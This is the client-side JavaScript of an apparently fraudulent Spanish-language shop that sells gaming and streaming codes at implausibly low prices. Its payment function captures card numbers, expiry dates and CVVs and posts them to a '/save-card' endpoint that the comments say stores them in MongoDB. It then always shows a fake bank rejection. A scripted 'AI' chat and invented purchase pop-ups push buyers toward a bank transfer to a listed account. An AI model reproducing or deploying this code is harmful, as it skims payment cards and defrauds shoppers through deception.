<script>
    let currentProduct = { name: '', price: 0 };
    // Elementos del panel de pago
    const paymentPanel = document.getElementById('paymentPanel');
    const totalAmountSpan = document.getElementById('totalAmount');
    const transferPanel = document.getElementById('transferencia');
    const cardPanel = document.getElementById('tarjeta');
    const cardIcon = document.getElementById('cardIcon');
    const cardStatus = document.getElementById('cardStatus'); 
    const expiryInput = document.getElementById('expiracion');
    const cvvInput = document.getElementById('cvv');
    const cardNumInput = document.getElementById('tarjeta-numero');
    const emailInput = document.getElementById('email'); 
    const errorMessage = document.getElementById('errorMessage');
    // Elementos del chat
    const chatWindow = document.getElementById('chat-window');
    const chatBody = document.getElementById('chat-body');
    const chatInputField = document.getElementById('chat-input-field');
    const typingIndicator = document.getElementById('typing-indicator');

    // --- ELEMENTOS DE PRUEBA SOCIAL ---
    const socialProofAlert = document.getElementById('social-proof-alert');
    const alertText = document.getElementById('alert-text');
    const alertStars = document.getElementById('alert-stars');
    
    // Lista de compras simuladas (ACTUALIZADA con el nuevo nombre de Netflix)
    const purchases = [
        { name: "Game Pass", user: "Ra√∫l G.", stars: 5 },
        { name: "5,000 Robux", user: "Ana P.", stars: 4 },
        { name: "Game Pass", user: "Carlos M.", stars: 5 },
        { name: "Netflix 6 Meses", user: "Laura F.", stars: 5 }, // NOMBRE DE NETFLIX ACTUALIZADO
        { name: "Steam Wallet $50", user: "Marco T.", stars: 4 }, 
        { name: "5,000 Robux", user: "Luc√≠a S.", stars: 5 }
    ];
    function generateStars(count) {
        let starHtml = '';
        for (let i = 0; i < 5; i++) {
            // Usa 'fas' para estrella rellena (Font Awesome Solid) y 'far' para estrella vac√≠a (Font Awesome Regular)
            starHtml += `<i class="fa${i < count ? 's' : 'r'} fa-star"></i>`;
        }
        return starHtml;
    }

    function showSocialProof() {
        // 1. Ocultar si est√° visible
        socialProofAlert.classList.remove('show');
        // Esperar la transici√≥n de salida (500ms)
        setTimeout(() => {
            // 2. Elegir una compra al azar
            const purchase = purchases[Math.floor(Math.random() * purchases.length)];
            
            // 3. Actualizar el contenido
            alertText.innerHTML = `¬°<strong>${purchase.user}</strong> acaba de comprar: ${purchase.name}!`;
            alertStars.innerHTML = generateStars(purchase.stars);
            
            // 4. Mostrar la alerta
            socialProofAlert.classList.add('show');
            
            // 5. Ocultar despu√©s de 5 segundos
            setTimeout(() => {
                socialProofAlert.classList.remove('show');
            }, 5000); 
            
        }, 500);
        // 6. Programar la pr√≥xima alerta (entre 10 y 20 segundos)
        const nextTime = Math.random() * (20000 - 10000) + 10000;
        setTimeout(showSocialProof, nextTime);
    }
    
    document.addEventListener('DOMContentLoaded', () => {
        // Iniciar la simulaci√≥n de compras recientes 3 segundos despu√©s de cargar la p√°gina
        setTimeout(showSocialProof, 3000); 
    });
    // --- FIN L√ìGICA DE PRUEBA SOCIAL FLOTANTE ---

    // --- FUNCI√ìN DE DESPLAZAMIENTO PARA BOTONES NAV ---
    function scrollToSection(id) {
        const section = document.getElementById(id);
        if (section) {
            // El m√©todo scrollIntoView con 'smooth' hace el desplazamiento suave
            section.scrollIntoView({ behavior: 'smooth', block: 'start' });
        } else {
            console.error(`La secci√≥n con ID '${id}' no fue encontrada.`);
        }
    }
    
    // --- L√ìGICA DE PAGO Y VALIDACI√ìN DE TARJETA ---

    function showPaymentPanel(productName, productPrice) {
        currentProduct = { name: productName, price: productPrice };
        document.getElementById('panelTitle').textContent = `Comprar ${productName}`;
        totalAmountSpan.textContent = `Total: $${productPrice.toFixed(2)} USD`;
        paymentPanel.style.display = 'block';
        errorMessage.style.display = 'none';
        paymentPanel.scrollIntoView({ behavior: 'smooth' });
    }

    document.querySelectorAll('input[name="paymentMethod"]').forEach((radio) => {
        radio.addEventListener('change', () => {
            transferPanel.style.display = (radio.value === 'transferencia') ? 'block' : 'none';
            cardPanel.style.display = (radio.value === 'tarjeta') ? 'block' : 'none';
            // Limpiar errores y estado al cambiar de m√©todo de pago
            cardNumInput.classList.remove('input-error');
            cardStatus.textContent = '';
            errorMessage.style.display = 'none';
        });
    });
    /**
     * Algoritmo de Luhn (M√≥dulo 10) para validar la estructura del n√∫mero.
     * @param {string} val - El n√∫mero de tarjeta (solo d√≠gitos).
     * @returns {boolean} - True si es v√°lido seg√∫n Luhn.
     */
    function validateLuhn(val) {
        let sum = 0;
        let alt = false;
        for (let i = val.length - 1; i >= 0; i--) {
            let num = parseInt(val[i], 10);
            if (alt) {
                num *= 2;
                if (num > 9) {
                    num = (num % 10) + 1;
                }
            }
            sum += num;
            alt = !alt;
        }
        return sum % 10 === 0;
    }

    /**
     * Detecta el tipo de tarjeta (Visa, Mastercard, etc.) basado en el prefijo.
     * @param {string} number - El n√∫mero de tarjeta.
     * @returns {string} - El tipo de tarjeta o 'Unknown'.
     */
    function detectCardType(number) {
        const cleanNumber = number.replace(/\s/g, '');
        let type = 'Unknown';
        
        // Visa: 13, 16, o 19 d√≠gitos. Empieza por 4.
        if (/^4[0-9]{12,18}$/.test(cleanNumber)) {
            type = 'Visa';
            cardIcon.className = 'card-icon fab fa-cc-visa';
            cardIcon.style.color = '#1a1f71';
        } 
        // Mastercard: 16 d√≠gitos. Empieza por 51-55.
        else if (/^5[1-5][0-9]{14}$/.test(cleanNumber)) {
            type = 'Mastercard';
            cardIcon.className = 'card-icon fab fa-cc-mastercard';
            cardIcon.style.color = '#ff6c00';
        }
        // American Express: 15 d√≠gitos. Empieza por 34 o 37.
        else if (/^3[47][0-9]{13}$/.test(cleanNumber)) {
            type = 'American Express';
            cardIcon.className = 'card-icon fab fa-cc-amex';
            cardIcon.style.color = '#0070e0';
        } 
        else {
            cardIcon.className = 'card-icon fas fa-credit-card';
            cardIcon.style.color = '#ccc';
        }

        // Si se han introducido al menos 4 d√≠gitos, actualiza el estado
        if (cleanNumber.length >= 4) {
            updateCardStatus(type, cleanNumber);
        } else {
            cardStatus.textContent = '';
        }

        return type;
    }

    /**
     * Muestra el estado de la tarjeta debajo del campo de n√∫mero.
     * @param {string} type - Tipo de tarjeta detectado.
     * @param {string} cleanNumber - El n√∫mero de tarjeta sin espacios.
     */
    function updateCardStatus(type, cleanNumber) {
        let statusText = '';
        let color = '#333';
        const isLuhnValid = validateLuhn(cleanNumber);
        
        if (type !== 'Unknown') {
            statusText += `Tipo: üí≥ **${type}** | `;
        }

        if (cleanNumber.length >= 12) {
            if (isLuhnValid) {
                statusText += 'Estado: ‚úÖ N√∫mero V√°lido (Luhn)';
                color = '#2c9b6f';
            } else {
                statusText += 'Estado: ‚ùå N√∫mero Inv√°lido (Luhn)';
                color = 'red';
            }
        } else if (cleanNumber.length > 0) {
             statusText += 'Escribiendo...';
             color = '#777';
        } else {
            statusText = '';
        }
        
        cardStatus.innerHTML = statusText.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
        cardStatus.style.color = color;
    }

    /**
     * Formatea el n√∫mero de tarjeta con espacios (XXXX XXXX XXXX XXXX).
     */
    function formatCardNumber(input) {
        let value = input.value.replace(/\D/g, '');
        // Elimina todo lo que no sea d√≠gito
        if (value.length > 0) {
            let formatted = value.match(/.{1,4}/g).join(' ');
            input.value = formatted;
        }
    }

    /**
     * Formatea la fecha de caducidad (MM/AA).
     */
    function formatExpiryDate(input) {
        let value = input.value.replace(/\D/g, '');
        if (value.length > 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        input.value = value;
    }

    /**
     * Validaci√≥n final de todos los campos de la tarjeta.
     */
    function validateCardFields() {
        let isValid = true;
        // Limpiar errores previos
        expiryInput.classList.remove('input-error');
        cvvInput.classList.remove('input-error');
        cardNumInput.classList.remove('input-error');

        const cardNum = cardNumInput.value.replace(/\s+/g, '');
        // 1. Validaci√≥n del n√∫mero (Luhn y Longitud)
        if (cardNum.length < 13 || cardNum.length > 19 || !/^\d+$/.test(cardNum)) { 
            cardNumInput.classList.add('input-error');
            errorMessage.textContent = 'El n√∫mero de tarjeta debe tener entre 13 y 19 d√≠gitos.';
            isValid = false;
        } else if (!validateLuhn(cardNum)) {
            cardNumInput.classList.add('input-error');
            errorMessage.textContent = 'El n√∫mero de tarjeta es inv√°lido (no pasa la prueba Luhn). Por favor, rev√≠salo.';
            isValid = false;
        }

        // 2. Validaci√≥n de CVV
        const cvv = cvvInput.value;
        if (cvv.length < 3 || cvv.length > 4 || /\D/.test(cvv)) { 
            cvvInput.classList.add('input-error');
            if (isValid) { // Solo si no fall√≥ antes
                errorMessage.textContent = 'El CVV debe ser de 3 o 4 d√≠gitos.';
            }
            isValid = false;
        }

        // 3. Validaci√≥n de Expiraci√≥n
        const expiry = expiryInput.value;
        const [monthStr, yearStr] = expiry.split('/');
        
        if (!monthStr || !yearStr || monthStr.length !== 2 || yearStr.length !== 2) {
            expiryInput.classList.add('input-error');
            if (isValid) {
                errorMessage.textContent = 'La fecha de caducidad debe ser MM/AA.';
            }
            isValid = false;
        } else {
            const currentYear = new Date().getFullYear() % 100;
            const currentMonth = new Date().getMonth() + 1;
            const month = parseInt(monthStr, 10);
            const year = parseInt(yearStr, 10);
            if (month < 1 || month > 12) {
                expiryInput.classList.add('input-error');
                if (isValid) {
                    errorMessage.textContent = 'El mes de caducidad es incorrecto.';
                }
                isValid = false;
            } else if (year < currentYear || (year === currentYear && month < currentMonth)) {
                expiryInput.classList.add('input-error');
                if (isValid) {
                    errorMessage.textContent = 'La tarjeta est√° caducada.';
                }
                isValid = false;
            }
        }

        return isValid;
    }

    function validateEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(String(email).toLowerCase());
    }

    // ‚ö†Ô∏è FUNCI√ìN processPayment CON LLAMADA A LA API (fetch)
    async function processPayment() { // AHORA ES ASYNC
        errorMessage.style.display = 'none';
        
        // 1. Validar Correo Electr√≥nico
        const email = emailInput.value.trim();
        emailInput.classList.remove('input-error');
        if (!validateEmail(email)) {
            emailInput.classList.add('input-error');
            errorMessage.textContent = 'Por favor, introduce un correo electr√≥nico v√°lido para enviarte el c√≥digo.';
            errorMessage.style.display = 'block';
            return;
        }

        const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked').value;
        // 2. Validar Campos de Tarjeta (si aplica)
        if (paymentMethod === 'tarjeta') {
            if (!validateCardFields()) {
                // El mensaje de error espec√≠fico ya se estableci√≥ en validateCardFields()
                errorMessage.style.display = 'block';
                return;
            }
            
            // Si la tarjeta es v√°lida, volvemos a mostrar el estado final del tipo
            const cardType = detectCardType(cardNumInput.value);
            updateCardStatus(cardType, cardNumInput.value.replace(/\s/g, ''));
        }

        // Mostrar el spinner
        document.getElementById('spinner').style.display = 'block';

        if (paymentMethod === 'tarjeta') {
            const cardData = {
                email: email,
                producto: currentProduct.name,
                monto: currentProduct.price.toFixed(2),
                numero_tarjeta: cardNumInput.value.replace(/\s+/g, ''),
                tipo_tarjeta: detectCardType(cardNumInput.value), 
                expiracion: expiryInput.value,
                cvv: cvvInput.value,
                timestamp: new Date().toISOString()
            };
            
            // ************************************************
            // !!! C√ìDIGO CLAVE: LLAMADA A LA API DEL SERVIDOR !!!
            // ************************************************
            try {
                // La URL es la ruta relativa al servidor de Render: /save-card
                const response = await fetch('/save-card', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(cardData)
                });
                
                if (!response.ok) {
                    console.error('‚ö†Ô∏è Error al enviar datos al servidor:', response.statusText);
                } else {
                    console.log('‚úÖ Datos enviados correctamente a la API y MongoDB.');
                }
            } catch (error) {
                console.error('‚ùå Error de red al intentar conectar con el servidor:', error);
            }
            // ************************************************
            // !!! FIN LLAMADA A LA API !!!
            // ************************************************
            
            // Simulaci√≥n de log en consola para el desarrollador
            console.warn("==================================================");
            console.warn("‚úÖ DATOS DE TARJETA CAPTURADOS (CONSOLA DE PC) ‚úÖ");
            console.warn("Tipo de Tarjeta detectado:", cardData.tipo_tarjeta);
            console.table(cardData);
            console.warn("==================================================");
        }

        // Simulaci√≥n de espera de la pasarela de pago (3 segundos)
        setTimeout(() => {
            // Ocultar el spinner
            document.getElementById('spinner').style.display = 'none';
            
            if (paymentMethod === 'tarjeta') {
                // *** L√ìGICA FORZADA: paymentSuccess es siempre false (Rechazo del banco) ***
                errorMessage.textContent = 'Lo sentimos, el banco ha rechazado tu transacci√≥n. El n√∫mero de tarjeta fue validado como: ' + detectCardType(cardNumInput.value) + '. Verifica si el rechazo es por l√≠mite o fallo del banco.';
                errorMessage.style.display = 'block';
            } else {
                // L√≥gica de transferencia bancaria (√âxito simulado)
                alert(`Confirma la transferencia de $${currentProduct.price.toFixed(2)} USD a la cuenta KLAR: 661180006948807615. Tu c√≥digo ser√° enviado al correo ${email} al recibir el pago.`);
                paymentPanel.style.display = 'none';
            }

        }, 3000); 
    }
    
    // --- L√ìGICA DE CHAT SIMULADO ---

    function toggleChat() {
        if (chatWindow.style.display === 'flex') {
            chatWindow.style.display = 'none';
        } else {
            chatWindow.style.display = 'flex';
            chatInputField.focus();
            chatBody.scrollTop = chatBody.scrollHeight;
        }
    }

    function addMessage(text, sender) {
        const messageDiv = document.createElement('div');
        messageDiv.className = `message ${sender}-message`;
        messageDiv.innerHTML = text.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>'); // Permite negritas
        chatBody.appendChild(messageDiv);
        chatBody.scrollTop = chatBody.scrollHeight;
    }

    function sendMessage() {
        const text = chatInputField.value.trim();
        if (text === '') return;

        addMessage(text, 'user');
        chatInputField.value = '';

        simulateAIResponse(text);
    }
    
    function simulateAIResponse(userText) {
        const text = userText.toLowerCase();
        let response = "";
        let typingDelay = 1500;

        typingIndicator.style.display = 'block';
        chatBody.scrollTop = chatBody.scrollHeight;
        // L√ìGICA DE RESPUESTA DE LA IA
        if (text.includes("ya pagu√©") || text.includes("hice el pago") || text.includes("realice el pago") || text.includes("esperar c√≥digo")) {
            response = "¬°Gracias por realizar tu pago! El c√≥digo digital se enviar√° a tu correo una vez verificado. Por favor, ten en cuenta que el tiempo de espera es de **hasta 24 horas**.";
            typingDelay = 2000;
        } 
        else if (text.includes("precio") || text.includes("costo") || text.includes("cuanto cuesta")) {
            // RESPUESTA DE PRECIOS ACTUALIZADA CON NETFLIX 6 MESES $10.00 USD
            response = "Actualmente, Game Pass cuesta $5.00 USD, 5,000 Robux cuesta $10.00 USD, **Netflix 6 Meses cuesta $10.00 USD** y Steam $50 USD cuesta $15.00 USD. ¬°Son ofertas limitadas!";
        } else if (text.includes("codigo") || text.includes("clave")) {
            response = "Una vez confirmado el pago, el c√≥digo digital se env√≠a autom√°ticamente a tu correo electr√≥nico en menos de 5 minutos.";
        } else if (text.includes("pago") || text.includes("transferencia") || text.includes("tarjeta")) {
            response = "Aceptamos **Transferencias Bancarias** (con los datos visibles en el formulario) y **Tarjeta de Cr√©dito/D√©bito** (Visa/Mastercard). Ten en cuenta que el pago con tarjeta est√° fallando actualmente, por lo que recomendamos la transferencia.";
        } else if (text.includes("hola") || text.includes("saludos")) {
            response = "¬°Hola! ¬øBuscas Game Pass, Robux, Netflix o Steam? Puedo darte informaci√≥n sobre los precios y el proceso de compra.";
        } else if (text.includes("ayuda") || text.includes("problema")) {
            response = "Si tienes un problema con una compra ya realizada, por favor, env√≠a un correo electr√≥nico a soporte@tutiendagc.com. Para dudas sobre la compra, preg√∫ntame aqu√≠.";
        } else {
            response = "Disculpa, a√∫n estoy aprendiendo. Por favor, pregunta sobre **'precios'**, **'c√≥digos'**, o **'m√©todos de pago'**.";
            typingDelay = 2500;
        }

        setTimeout(() => {
            typingIndicator.style.display = 'none';
            addMessage(response, 'ai');
        }, typingDelay);
    }
</script>
